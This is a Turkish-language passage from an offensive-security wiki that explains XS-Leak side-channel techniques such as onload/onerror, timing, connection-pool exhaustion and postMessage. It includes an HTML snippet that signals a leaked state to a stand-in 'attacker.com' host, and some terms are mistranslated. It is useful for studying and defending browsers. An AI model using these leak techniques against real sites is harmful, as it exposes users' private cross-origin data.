# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Sıfırdan kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬** [**Discord grubuna**](https://discord.gg/hRep4RUj7f) **veya** [**telegram grubuna**](https://t.me/peass) **katılın veya** Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR'lar gönderin.

</details>

## Temel Bilgiler

XS-Arama, **yan kanal zafiyetlerinden yararlanarak** **çapraz kökenli bilgileri çıkarmak** için kullanılan bir yöntemdir.

Bu saldırıda yer alan ana bileşenler şunlardır:

* **Zararlı Web**: Bilgilerin çıkarılması amaçlanan hedef web sitesi.
* **Saldırganın Web'i**: Saldırgan tarafından oluşturulan zararlı web sitesi, kurbanın ziyaret ettiği ve saldırıyı barındıran site.
* **Dahil Etme Yöntemi**: Zararlı Web'i Saldırganın Web'ine dahil etmek için kullanılan teknik (örneğin, window.open, iframe, fetch, href ile HTML etiketi vb.).
* **Sızıntı Tekniği**: Dahil etme yöntemi aracılığıyla toplanan bilgilere dayanarak Zararlı Web'in durumu arasındaki farkları ayırt etmek için kullanılan teknikler.
* **Durumlar**: Saldırganın ayırt etmeyi amaçladığı Zararlı Web'in iki potansiyel durumu.
* **Algılanabilir Farklar**: Saldırganın Zararlı Web'in durumunu çıkarmak için güvendiği gözlemlenebilir farklar.

### Algılanabilir Farklar

Zararlı Web'in durumlarını ayırt etmek için birkaç yön incelenebilir:

* **Durum Kodu**: **Farklı HTTP yanıt durum kodları** arasındaki ayrımı yapmak, sunucu hataları, istemci hataları veya kimlik doğrulama hataları gibi çapraz kökenli olarak.
* **API Kullanımı**: Sayfalar arasında **Web API'lerinin kullanımını** tanımlamak, çapraz kökenli bir sayfanın belirli bir JavaScript Web API'sini kullanıp kullanmadığını ortaya çıkarabilir.
* **Yönlendirmeler**: Yalnızca HTTP yönlendirmeler değil, aynı zamanda JavaScript veya HTML tarafından tetiklenen farklı sayfalara yönlendirmeleri tespit etmek.
* **Sayfa İçeriği**: HTTP yanıt gövdesinde veya sayfa alt kaynaklarında (örneğin, gömülü çerçevelerin sayısı veya görüntülerdeki boyut farklılıkları gibi) **değişiklikleri gözlemlemek**.
* **HTTP Başlığı**: Belirli bir **HTTP yanıt başlığının** varlığını veya değerini belirlemek, X-Frame-Options, Content-Disposition ve Cross-Origin-Resource-Policy gibi başlıkların yanı sıra.
* **Zamanlama**: İki durum arasındaki tutarlı zaman farklarını fark etmek.

### Dahil Etme Yöntemleri

* **HTML Elemanları**: HTML, tarayıcının bir HTML dışı kaynağı istemesini sağlayan stiller, görüntüler veya betikler gibi **çapraz kökenli kaynakları dahil etmek için çeşitli elemanlar sunar**. Bu amaçla potansiyel HTML elemanlarının derlemesi [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) adresinde bulunabilir.
* **Çerçeveler**: **iframe**, **object** ve **embed** gibi elemanlar, HTML kaynaklarını doğrudan saldırganın sayfasına gömebilir. Sayfanın **çerçeve koruması olmadığında**, JavaScript, çerçevelenmiş kaynağın window nesnesine contentWindow özelliği aracılığıyla erişebilir.
* **Açılır Pencereler**: **`window.open`** yöntemi, JavaScript'in SOP'u takip ederek yöntemlere ve özelliklere etkileşimde bulunabileceği yeni bir sekmede veya pencerede bir kaynak açar. Sık ​​kullanılan açılır pencereler, hedef kaynağın çerçeveleme ve çerez kısıtlamalarını atlatır. Ancak modern tarayıcılar açılır pencerelerin oluşturulmasını belirli kullanıcı eylemlerine sınırlar.
* **JavaScript İstekleri**: JavaScript, **XMLHttpRequests** veya **Fetch API** kullanarak hedef kaynaklara doğrudan istekler yapılmasına izin verir. Bu yöntemler, HTTP yönlendirmelerini takip etmeyi seçmek gibi isteği üzerinde hassas kontrol sağlar.

### Sızıntı Teknikleri

* **Olay İşleyici**: XS-Sızıntılarda klasik bir sızıntı tekniği olan olay işleyicileri olan **onload** ve **onerror**, kaynağın yüklenme başarısı veya başarısızlığı hakkında bilgi sağlar.
* **Hata Mesajları**: JavaScript istisnaları veya özel hata sayfaları, hata mesajından doğrudan veya varlığının ve yokluğunun ayrımından bilgi sağlayabilir.
* **Global Sınırlar**: Tarayıcının fiziksel sınırları, bellek kapasitesi veya diğer zorunlu tarayıcı sınırları gibi, bir eşiğe ulaşıldığında sızıntı tekniği olarak işlev görebilir.
* **Global Durum**: Tarayıcıların **global durumlarıyla** (örneğin, Geçmiş arabirimi) algılanabilir etkileşimler söz konusu olduğunda, söz konusu durumlar sömürülebilir. Örneğin, bir tarayıcının geçmişindeki **giriş sayısı**, çapraz kökenli sayfalar hakkında ipuçları sağlayabilir.
* **Performans API'si**: Bu API, mevcut sayfanın **performans detaylarını** sağlar, belge ve yüklenen kaynaklar için ağ zamanlamasını içerir, istenen kaynaklar hakkında çıkarımlar yapmayı mümkün kılar.
* **Okunabilir Öznitelikler**: Bazı HTML öznitelikleri **çapraz kökenli okunabilir** ve sızıntı tekniği olarak kullanılabilir. Örneğin, `window.frame.length` özelliği, JavaScript'in çapraz kökenli bir web sayfasındaki çerçeveleri saymasına olanak tanır.

## XSinator Aracı ve Makale

XSinator, **makalesinde açıklanan çeşitli bilinen XS-Sızıntılarına karşı tarayıcıları kontrol etmek için otomatik bir araçtır**: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Araça [**https://xsinator.com/**](https://xsinator.com/) adresinden erişebilirsiniz.

{% hint style="warning" %}
**Dışlanmış XS-Sızıntıları**: Diğer sızıntıları XSinator'da engelleyeceği için **hizmet işçilerine dayanan XS-Sızıntılarını** dışlamak zorunda kaldık. Ayrıca, belirli bir web uygulamasındaki yanlış yapılandırmalar ve hatalara dayanan XS-Sızıntılarını dışlamayı tercih ettik. Örneğin, Cross-Origin Resource Sharing (CORS) yanlış yapılandırmaları, postMessage sızıntıları veya Cross-Site Scripting. Ayrıca, genellikle yavaş, gürültülü ve doğru olmayan zaman tabanlı XS-Sızıntılarını dışladık.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Zaman Tabanlı Teknikler**

Aşağıdaki tekniklerden bazıları, web sayfalarının olası durumlarındaki farklılıkları tespit etmek için süre ölçümünü kullanacak. Bir web tarayıcısında zamanı ölçmenin farklı yolları vardır.

**Saatler**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API, geliştiricilere yüksek çözünürlüklü zamanlama ölçümleri almasını sağlar.\
Saldırganların zımni saatler oluşturmak için kötüye kullanabileceği önemli sayıda API vardır: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasyonları ve diğerleri.\
Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Olay İşleyici Teknikleri

### Onload/Onerror

* **Dahil Etme Yöntemleri**: Çerçeveler, HTML Öğeleri
* **Algılanabilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Özet**: Bir kaynağı yüklemeye çalışırken onerror/onload olayları tetiklendiğinde kaynağın başarılı/başarısız bir şekilde yüklendiği durum kodunu belirlemek mümkündür.
* **Kod örneği**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Kod örneği, **JS'den script nesneleri yüklemeyi deniyor**, ancak **nesneler, stil sayfaları, resimler, sesler** gibi diğer etiketler de kullanılabilir. Ayrıca, etiketi **doğrudan enjekte etmek** ve `onload` ve `onerror` olaylarını etiketin içine (JS'den enjekte etmek yerine) bildirmek de mümkündür.

Bu saldırının ayrıca bir script olmayan versiyonu da bulunmaktadır:

```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```

### Onload Zamanlama

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Özet:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** bir isteğin gerçekleştirilmesi için ne kadar zaman aldığını ölçmek için kullanılabilir. Ancak, [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) gibi diğer saatler de kullanılabilir, bu saatler 50 ms'den fazla süren görevleri tanımlayabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) başka bir örnek:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload Zamanlama + Zorunlu Ağır Görev

Bu teknik bir öncekiyle aynıdır, ancak **saldırgan** ayrıca **cevap olumlu veya olumsuz olduğunda** bazı eylemleri **ilgili bir süre alacak şekilde zorlar** ve o süreyi ölçer.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Zamanlama

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Özet:** [SharedArrayBuffer saat](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) bir isteğin gerçekleştirilmesi için ne kadar zaman aldığını ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynağın alınması için geçen süre, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) etkinliklerini kullanarak ölçülebilir. **`beforeunload`** etkinliği tarayıcının yeni bir sayfaya geçmeye hazırlandığı zaman tetiklenirken, **`unload`** etkinliği navigasyon gerçekleştiğinde meydana gelir. Bu iki etkinlik arasındaki zaman farkı, tarayıcının kaynağı almak için harcadığı süreyi belirlemek için hesaplanabilir.

### Kumlanmış Çerçeve Zamanlama + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Özet:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API bir isteğin gerçekleştirilmesi için ne kadar zaman aldığını ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) olmadığında, bir sayfa ve alt kaynaklarının ağ üzerinden yüklenmesi için gereken süre bir saldırgan tarafından ölçülebilir. Bu ölçüm genellikle, bir iframe'in `onload` işleyicisinin, kaynak yükleme ve JavaScript yürütmesinin tamamlanmasından sonra tetiklendiği için mümkündür. Betik yürütmesi tarafından tanıtılan değişkenliği atlamak için bir saldırgan, `<iframe>` içinde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) özniteliğini kullanabilir. Bu özniteliğin eklenmesi, JavaScript'in yürütülmesini kısıtlayarak, özellikle ağ performansı tarafından büyük ölçüde etkilenen bir ölçümü kolaylaştırır.

```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```

### #ID + hata + onload

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**:
* **Özet**: Sayfa doğru içeriğe erişildiğinde hata almayı sağlayabilir ve herhangi bir içeriğe erişildiğinde doğru şekilde yüklenmesini sağlayabilirseniz, zamanı ölçmeden tüm bilgileri çıkarmak için bir döngü oluşturabilirsiniz.
* **Kod Örneği**:

Örneğin, **gizli** içeriğe sahip **sayfayı** bir **Iframe** içine **yerleştirebileceğinizi** varsayalım.

Kurbanın "_**bayrak**_" içeren dosyayı aramasını sağlayabilirsiniz, bir **Iframe** kullanarak (örneğin CSRF'yi sömürerek). Iframe içinde, _**onload olayının**_ en az bir kez **her zaman** gerçekleştirileceğini biliyorsunuz. Sonra, **URL**'nin içindeki **hash**'in **yalnızca içeriğini değiştirerek** Iframe'nin **URL**'sini değiştirebilirsiniz.

Örneğin:

1. **URL1**: www.saldırgan.com/xssearch#deneme1
2. **URL2**: www.saldırgan.com/xssearch#deneme2

İlk URL **başarılı bir şekilde yüklendiğinde**, URL'nin **hash** kısmını **değiştirdiğinizde**, **onload** olayı **tekrar tetiklenmeyecek**. Ancak **sayfa** yüklenirken bir tür **hata** varsa, o zaman **onload** olayı **tekrar tetiklenecektir**.

Bu şekilde, **doğru bir şekilde** yüklenen bir sayfa ile erişilen bir sayfa arasında **ayırt edebilirsiniz**.

### Javascript Yürütme

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**:
* **Özet:** Eğer **sayfa**, **duyarlı** içeriği **geri döndürüyorsa** veya kullanıcı tarafından **kontrol edilebilecek bir içerik**. Kullanıcı, **geçerli JS kodunu negatif durumda** ayarlayabilir ve her denemeyi **`<script>`** etiketleri içinde **yükleme** yapabilir, böylece **negatif** durumlarda saldırganların **kodu** **yürütülür**, ve **olumlu** durumlarda **hiçbir şey** yürütülmez.
* **Kod Örneği:**

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu ve Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Özet**: **Cross-Origin Read Blocking (CORB)**, **Spectre** gibi saldırılara karşı korunmak için belirli hassas çapraz kökenli kaynakların yüklenmesini engelleyen bir güvenlik önlemidir. Ancak, saldırganlar koruyucu davranışını sömürebilir. **CORB**'a tabi bir yanıt, `nosniff` ile korunan bir _**CORB korumalı**_ `Content-Type` ile `2xx` durum kodu döndürdüğünde, **CORB** yanıtın gövdesini ve başlıklarını sıyırır. Bunu gözlemleyen saldırganlar, **başarılı veya hata içeren** sayfa arasındaki **durum kodu** (başarı veya hata gösteren) ve `Content-Type`'ın (CORB tarafından korunup korunmadığını belirten) kombinasyonunu çıkarabilir, potansiyel bilgi sızıntısına yol açabilir.
* **Kod Örneği**:

Saldırı hakkında daha fazla bilgi için daha fazla bilgi bağlantısını kontrol edin.

### onblur

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Özet**: ID veya ad özniteliğinden hassas veri sızdırma.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Bir **iframe** içine bir sayfa **yüklemek** ve sayfanın **`#id_değeri`**'ni kullanarak, iframe'in elemanına odaklanmasını sağlamak mümkündür, ardından bir **`onblur`** sinyali tetiklendiğinde, ID elemanı var olur.\
Aynı saldırıyı **`portal`** etiketleri ile gerçekleştirebilirsiniz.

### postMessage Yayınları <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Özet**: Bir postMessage'dan hassas bilgileri toplamak veya postMessage'ın varlığını bir orak olarak kullanarak kullanıcının sayfadaki durumunu bilmek.
* **Kod Örneği**: `Tüm postMessage'ları dinleyen herhangi bir kod.`

Uygulamalar genellikle farklı kökenler arasında iletişim kurmak için [`postMessage` yayınlarını](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) kullanır. Ancak, `targetOrigin` parametresinin doğru şekilde belirtilmediği durumlarda bu yöntem yanlışlıkla **hassas bilgileri** ortaya çıkarabilir, mesajları almak için herhangi bir pencereye izin verir. Ayrıca, bir mesaj almanın sadece **bir orak** olarak hareket edebileceğini unutmamak gerekir; örneğin, belirli mesajlar yalnızca oturum açmış kullanıcılara gönderilebilir. Bu nedenle, bu mesajların varlığı veya yokluğu, kullanıcının durumu veya kimliği hakkında bilgi verebilir, örneğin oturum açmış olup olmadıkları gibi.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Sınırlar Teknikleri

### WebSocket API

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Özet**: WebSocket bağlantı sınırını tüketmek, çapraz kökenli bir sayfanın WebSocket bağlantılarının sayısını sızdırır.
* **Kod Örneği**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Hedef sayfanın kaç **WebSocket bağlantısı kullandığını** ve nasıl kullandığını belirlemek mümkündür. Bu, bir saldırganın uygulama durumlarını tespit etmesine ve WebSocket bağlantılarının sayısıyla ilişkili bilgileri sızdırmasına olanak tanır.

Bir **köken**, bağlantılarının durumlarına bakılmaksızın, **maksimum miktarda WebSocket** bağlantı nesnesini kullandığında, yeni nesnelerin oluşturulması **JavaScript istisnalarına neden olur**. Bu saldırıyı gerçekleştirmek için, saldırgan web sitesi hedef web sitesini bir açılır pencerede veya iframe içinde açar ve hedef web sitesi yüklendikten sonra, mümkün olan en fazla WebSocket bağlantısını oluşturmaya çalışır. **Atılan istisnaların sayısı**, hedef web sitesi penceresi tarafından kullanılan **WebSocket bağlantılarının sayısıdır**.

### Ödeme API

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Özet**: Yalnızca bir ödeme isteğinin aynı anda etkin olabileceğini belirleyin.
* **Kod Örneği**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Bu XS-Leak, bir saldırganın **çapraz kökenli bir sayfanın bir ödeme isteği başlattığını algılamasına** olanak tanır.

Çünkü **yalnızca bir ödeme isteği aynı anda etkin olabilir**, hedef web sitesi Ödeme İsteği API'sını kullanıyorsa, bu API'yi kullanmaya yönelik **diğer girişimler başarısız olacak** ve bir **JavaScript istisnasına** neden olacaktır. Saldırgan, bu durumu istismar ederek **periyodik olarak Ödeme API arayüzünü göstermeye çalışabilir**. Bir deneme istisna oluşturursa, hedef web sitesi şu anda bunu kullanıyor demektir. Saldırgan, bu periyodik denemeleri hemen oluşturduktan sonra arayüzü kapatılarak gizleyebilir.

### Olay Döngüsünün Zamanlaması <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Dahil Etme Yöntemleri**:
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Özet:** Tek iplikli JS olay döngüsünü kötüye kullanarak bir web sayfasının yürütme süresini ölçün.
* **Kod Örneği**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript, [tek iplikli bir olay döngüsü](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) eşzamanlılık modelinde çalışır, bu da **yalnızca bir görevi aynı anda yürütebileceği anlamına gelir**. Bu özellik, **farklı kökenden gelen kodun ne kadar sürede yürütüldüğünü ölçmek** için sömürülebilir. Bir saldırgan, kendi kodlarının olay döngüsündeki yürütme süresini sürekli olarak sabit özelliklere sahip olaylar göndererek ölçebilir. Bu olaylar, olay havuzu boş olduğunda işlenecektir. Diğer kökenlerin de aynı havuza olaylar gönderdiği durumda, bir **saldırgan, kendi görevlerinin yürütülmesindeki gecikmeleri gözlemleyerek dış olayların yürütülme süresini çıkarabilir**. Bu gecikmeleri izlemek için olay döngüsünü izleme yöntemi, farklı kökenlerden gelen kodun yürütme süresini ortaya çıkarabilir ve hassas bilgileri ortaya çıkarabilir.

{% hint style="warning" %}
Bir yürütme zamanlamasında **ağ faktörlerini ortadan kaldırmak** ve **daha kesin ölçümler** elde etmek mümkündür. Örneğin, sayfayı yüklemeden önce sayfada kullanılan kaynakları yükleyerek.
{% endhint %}

### Meşgul Olay Döngüsü <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Dahil Etme Yöntemleri**:
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Özet:** Bir web işleminin yürütme süresini ölçmenin bir yolu, bir ipliğin olay döngüsünü kasıtlı olarak engelleyerek ve ardından olay döngüsünün tekrar erişilebilir hale gelmesinin ne kadar sürdüğünü zamanlamaktır. Bir olay döngüsüne (uzun bir hesaplama veya senkron API çağrısı gibi) engelleyici bir işlem ekleyerek ve ardından sonraki kodun yürütmeye başlamasının ne kadar sürdüğünü izleyerek, olay döngüsü sırasında engelleme süresince yürütülen görevlerin süresini çıkarabilirsiniz. Bu teknik, JavaScript'in olay döngüsünün tek iplikli doğasından yararlanır, burada görevler sıralı olarak yürütülür ve aynı ipliği paylaşan diğer işlemlerin performansı veya davranışı hakkında bilgi sağlayabilir.
* **Kod Örneği**:

Olay döngüsünü kilitleyerek yürütme süresini ölçme tekniğinin önemli bir avantajı, **Site İzolasyonu**'nu atlatma potansiyeline sahip olmasıdır. **Site İzolasyonu**, farklı web sitelerini ayrı işlemlere ayıran ve kötü niyetli sitelerin doğrudan diğer sitelerden hassas verilere erişmesini engellemeyi amaçlayan bir güvenlik özelliğidir. Ancak, başka bir kökenin yürütme zamanlamasını paylaşılan olay döngüsü aracılığıyla etkileyerek, bir saldırgan, o kökenin etkinlikleri hakkında dolaylı olarak bilgi çıkarabilir. Bu yöntem, diğer kökenin verilerine doğrudan erişime dayanmaz, ancak o kökenin etkinliklerinin paylaşılan olay döngüsündeki etkisini gözlemler ve dolayısıyla **Site İzolasyonu** tarafından oluşturulan koruyucu bariyerlerden kaçınır.

{% hint style="warning" %}
Bir yürütme zamanlamasında **ağ faktörlerini ortadan kaldırmak** ve **daha kesin ölçümler** elde etmek mümkündür. Örneğin, sayfayı yüklemeden önce sayfada kullanılan kaynakları yükleyerek.
{% endhint %}

### Bağlantı Havuzu

* **Dahil Etme Yöntemleri**: JavaScript İstekleri
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Özet:** Bir saldırgan, tüm soketleri kilitler, hedef web sayfasını yükler ve aynı anda başka bir sayfayı yükler; son sayfanın yüklenmeye başlaması hedef sayfanın yüklenme süresidir.
* **Kod Örneği**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

Tarayıcılar sunucu iletişimi için soketleri kullanır, ancak işletim sistemi ve donanımın sınırlı kaynakları nedeniyle, **tarayıcılar eşzamanlı soket sayısına bir sınırlama** getirmek zorundadır. Saldırganlar bu sınırlamayı aşağıdaki adımlarla sömürebilir:

1. Tarayıcının soket sınırını belirleyin, örneğin, 256 global soket.
2. Bağlantıları tamamlamadan açık tutacak şekilde farklı ana bilgisayarlara 255 istek başlatarak 255 soketi uzun süre işgal edin.
3.
   256. soketi hedef sayfaya bir istek göndermek için kullanın.
4. Farklı bir ana bilgisayara 257. isteği göndermeye çalışın. Tüm soketlerin kullanımda olduğu (2. ve 3. adımlara göre) göz önüne alındığında, bu istek bir soket kullanılabilir hale gelene kadar sıraya alınacaktır. Bu isteğin devam etmeden önceki gecikme, saldırgana 256. soketle ilişkili ağ etkinliği hakkında zamanlama bilgisi sağlar. Bu çıkarım, 2. adımdaki 255 soketin hala meşgul olduğunu ve herhangi yeni kullanılabilir soketin 3. adımdan serbest bırakılan soket olması gerektiğini ima ettiğinden mümkündür. 256. soketin kullanılabilir hale gelme süresi, dolayısıyla hedef sayfaya yapılan isteğin tamamlanması için gereken süre ile doğrudan ilişkilidir.

Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Bağlantı Havuzu Hedefe Göre

* **Dahil Etme Yöntemleri**: JavaScript İstekleri
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**:
* **Özet:** Önceki teknik gibi ancak tüm soketleri kullanmak yerine, Google **Chrome** aynı kökene **6 eşzamanlı istek sınırı** koyar. Eğer **5'ini bloke eder** ve ardından **6. bir istek başlatırsak**, bunu **zamanlayabiliriz** ve **kurban sayfanın** aynı uca **daha fazla istek göndermesini sağlayarak sayfanın durumunu algılamak** için **6. istek** daha **uzun sürecektir** ve bunu algılayabiliriz.

## Performans API Teknikleri

